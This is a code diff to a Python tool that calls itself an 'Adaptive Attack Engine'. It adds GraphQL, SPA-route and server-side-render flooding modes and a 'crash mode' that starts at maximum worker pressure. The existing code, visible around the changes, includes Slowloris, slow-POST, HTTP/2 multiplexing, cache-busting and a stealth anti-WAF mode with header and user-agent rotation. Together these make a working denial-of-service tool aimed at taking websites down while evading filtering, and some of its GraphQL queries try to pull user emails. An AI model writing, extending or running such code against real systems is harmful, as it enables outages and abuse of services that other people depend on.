@@ -180,10 +180,12 @@ class LiveLog:
     def format_line(self, entry: dict) -> str:
         mode_colors = {'login': C.CY, 'page': C.B, 'resource': C.M,
                        'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY,
-                       'slow_post': C.Y, 'h2mux': C.CY, 'cache_decep': C.M, 'origin': C.G}
+                       'slow_post': C.Y, 'h2mux': C.CY, 'cache_decep': C.M, 'origin': C.G,
+                       'graphql': C.G, 'spa_route': C.B, 'ssr_render': C.M}
         mode_icons = {'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
                       'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  ',
-                      'slow_post': 'SPO ', 'h2mux': 'H2M ', 'cache_decep': 'CD  ', 'origin': 'ORI '}
+                      'slow_post': 'SPO ', 'h2mux': 'H2M ', 'cache_decep': 'CD  ', 'origin': 'ORI ',
+                      'graphql': 'GQL ', 'spa_route': 'SPA ', 'ssr_render': 'SSR '}
         mc = mode_colors.get(entry['mode'], C.W)
         icon = mode_icons.get(entry['mode'], '????')
         status = entry['status']
@@ -329,6 +331,9 @@ class Stats:
     h2mux_hits: int = 0
     cache_decep_hits: int = 0
     origin_hits: int = 0
+    graphql_hits: int = 0
+    spa_route_hits: int = 0
+    ssr_render_hits: int = 0
     rts: deque = field(default_factory=lambda: deque(maxlen=50000))
     codes: Dict[int, int] = field(default_factory=dict)
     _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
@@ -675,6 +680,7 @@ class VFTester:
         consecutive_fails = 0
         while not self._stop.is_set():
             urls = random.sample(resources, min(3, len(resources)))
+            result = None
             for url in urls:
                 if self._stop.is_set(): break
                 t = time.time()
@@ -693,7 +699,7 @@ class VFTester:
                     await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
                     self.health_monitor.record(result)
                 self._record(result)
-            if not result.ok:
+            if result is None or not result.ok:
                 consecutive_fails += 1
                 await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
             else:
@@ -1192,6 +1198,9 @@ class VFTester:
         elif r.mode == "h2mux": self.stats.h2mux_hits += 1
         elif r.mode == "cache_decep": self.stats.cache_decep_hits += 1
         elif r.mode == "origin": self.stats.origin_hits += 1
+        elif r.mode == "graphql": self.stats.graphql_hits += 1
+        elif r.mode == "spa_route": self.stats.spa_route_hits += 1
+        elif r.mode == "ssr_render": self.stats.ssr_render_hits += 1
 
     async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
         """Persistent worker wrapper — respawns inner workers when they die"""
@@ -1320,6 +1329,21 @@ class VFTester:
                     await self._single_cache_deception(session)
                 elif chosen == "origin":
                     await self._single_origin_direct(session)
+                elif chosen == "graphql":
+                    endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
+                    gql_endpoint = self.attack.get("spa_config", {}).get("graphql_endpoint", "")
+                    if gql_endpoint:
+                        await self._single_graphql(session, gql_endpoint)
+                    elif endpoints:
+                        await self._single_graphql(session, endpoints[0])
+                    else:
+                        await self._single_api(session, [self.url])
+                elif chosen == "spa_route":
+                    routes = self.attack.get("spa_config", {}).get("spa_routes", [])
+                    await self._single_spa_route(session, routes)
+                elif chosen == "ssr_render":
+                    routes = self.attack.get("spa_config", {}).get("ssr_routes", [])
+                    await self._single_ssr_render(session, routes)
                 else:
                     await self._single_page(session, pages)
 
@@ -1333,6 +1357,94 @@ class VFTester:
                 # Worker crashed — log and respawn after short delay
                 if not self._stop.is_set():
                     await asyncio.sleep(0.1)
+
+    # ─── SPA-Specific Single Request Methods ──────────────────────────────
+
+    async def _single_graphql(self, session, endpoint):
+        """Single GraphQL request cycle"""
+        if not endpoint:
+            await self._single_api(session, [self.url])
+            return
+        t = time.time()
+        try:
+            graphql_queries = [
+                '{"query":"{ __schema { types { name } } }"}',
+                '{"query":"{ users { id name email } }"}',
+                f'{{"query":"{{ search(query:\\"{rand_user()}\\") {{ id title }} }}"}}',
+                f'{{"query":"mutation {{ createPost(input: {{ title:\\"{rand_user()}\\", body:\\"{rand_pass()}\\" }}) {{ id }} }}"}}',
+            ]
+            query = random.choice(graphql_queries)
+            headers = {**self._base_headers(),
+                      "Content-Type": "application/json",
+                      "Accept": "application/json"}
+            url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
+            async with session.post(busted, headers=headers, data=query,
+                                   ssl=False, allow_redirects=False) as resp:
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="graphql", hint=f"GQL {resp.status}", url=url)
+                await self.live_log.add("graphql", resp.status, elapsed, None, url, result.hint)
+                self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="graphql",
+                              err=type(e).__name__, url=endpoint)
+            await self.live_log.add("graphql", None, result.rt, type(e).__name__, endpoint)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_spa_route(self, session, routes):
+        """Single SPA route request cycle"""
+        if not routes: routes = [self.url]
+        t = time.time()
+        route = random.choice(routes)
+        url = route if route.startswith('http') else f"{self.site_root}{route}"
+        try:
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+            headers = {**self._base_headers(),
+                      "Accept": "application/json, text/plain, */*",
+                      "X-Requested-With": "XMLHttpRequest"}
+            async with session.get(busted, headers=headers,
+                                   ssl=False, allow_redirects=True) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="spa_route", hint=f"SPA {resp.status} ({len(body):,}B)", url=url)
+                await self.live_log.add("spa_route", resp.status, elapsed, None, url, result.hint)
+                self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="spa_route",
+                              err=type(e).__name__, url=url)
+            await self.live_log.add("spa_route", None, result.rt, type(e).__name__, url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_ssr_render(self, session, routes):
+        """Single SSR render request cycle — forces server-side rendering"""
+        if not routes: routes = [self.url]
+        t = time.time()
+        route = random.choice(routes)
+        url = route if route.startswith('http') else f"{self.site_root}{route}"
+        try:
+            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
+            headers = {**self._base_headers(),
+                      "Accept": "text/html,application/xhtml+xml",
+                      "Cache-Control": "no-cache, no-store, must-revalidate",
+                      "Pragma": "no-cache"}
+            async with session.get(busted, headers=headers,
+                                   ssl=False, allow_redirects=True) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="ssr_render", hint=f"SSR {resp.status} ({len(body):,}B)", url=url)
+                await self.live_log.add("ssr_render", resp.status, elapsed, None, url, result.hint)
+                self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="ssr_render",
+                              err=type(e).__name__, url=url)
+            await self.live_log.add("ssr_render", None, result.rt, type(e).__name__, url)
+            self.health_monitor.record(result)
+        self._record(result)
 
     async def _single_login(self, session):
         """Single login attempt"""
@@ -1394,6 +1506,9 @@ class VFTester:
 
     async def _single_resource(self, session, resources):
         """Single resource request"""
+        if not resources:
+            await self._single_page(session, [self.url])
+            return
         url = random.choice(resources)
         t = time.time()
         try:
@@ -1998,12 +2113,13 @@ def parse_args():
     p = argparse.ArgumentParser(
         description="VF_TESTER — Adaptive Attack Engine",
         formatter_class=argparse.RawDescriptionHelpFormatter)
+    p.add_argument("url", nargs='?', default=None, help="Target URL (positional or --url)")
     p.add_argument("--profile", default=None, help="VF_PROFILE.json from VF_FINDER")
-    p.add_argument("--url", default=None, help="Target URL (auto-runs FINDER if no profile; will prompt if omitted)")
+    p.add_argument("--url", default=None, help="Target URL (auto-runs FINDER if no profile)")
     p.add_argument("--max-workers", type=int, default=None, help="Override max workers")
     p.add_argument("--step", type=int, default=None, help="Override step size")
     p.add_argument("--stealth", action="store_true", help="Stealth mode: slow ramp, low workers, high delay, header randomization (anti-WAF)")
-    p.add_argument("--crash-mode", action="store_true", help="Force crash mode")
+    p.add_argument("--crash-mode", action="store_true", help="Force crash mode (start at max pressure)")
     p.add_argument("--deep", action="store_true", help="Run FINDER with deep scan")
     p.add_argument("--dns", action="store_true", help="Run FINDER with DNS scan")
     return p.parse_args()
@@ -2059,10 +2175,11 @@ async def main():
     args = parse_args()
 
     profile_path = args.profile
+    crash_mode = args.crash_mode
 
     # If no profile, run FINDER first
     if not profile_path:
-        url = args.url
+        url = args.url or getattr(args, 'url', None)
         if not url:
             # Interactive prompt — ask user for target URL
             print(f"\n{'='*72}")
@@ -2092,6 +2209,14 @@ async def main():
         print(f"  {C.CY}[STEALTH] Mode activated — low profile anti-WAF{C.RS}")
         print(f"  {C.CY}[STEALTH] Workers: {tester.initial_workers}->{tester.max_workers} | Step: +{tester.step} every {tester.step_duration}s | Delay: {tester.request_delay_ms}ms{C.RS}")
         print(f"  {C.CY}[STEALTH] Header randomization: ON | Cache bust: ON | UA rotation: ON{C.RS}")
+
+    # Crash mode — start at maximum pressure
+    if crash_mode:
+        tester.initial_workers = tester.max_workers
+        tester.step = tester.max_workers
+        tester.health_monitor.crash_mode_active = True
+        print(f"  {C.BD}{C.R}[CRASH MODE] Starting at MAXIMUM pressure!{C.RS}")
+        print(f"  {C.BD}{C.R}[CRASH MODE] Workers: {tester.max_workers:,} | Step: +{tester.step}{C.RS}")
 
     # Apply overrides
     if args.max_workers:
